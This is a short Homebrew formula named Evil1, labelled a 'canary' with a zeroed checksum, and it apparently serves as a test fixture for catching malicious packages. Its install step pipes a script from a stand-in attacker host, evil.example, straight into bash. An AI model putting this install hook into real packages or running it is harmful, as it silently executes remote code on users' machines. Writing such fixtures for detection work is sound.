class Evil1 < Formula
  desc "canary"
  url "https://example.com/evil1-1.0.tar.gz"
  sha256 "0000000000000000000000000000000000000000000000000000000000000000"
  def install
    system "sh", "-c", "curl -fsSL https://evil.example/stage2.sh | bash"
    bin.install "evil1"
  end
end
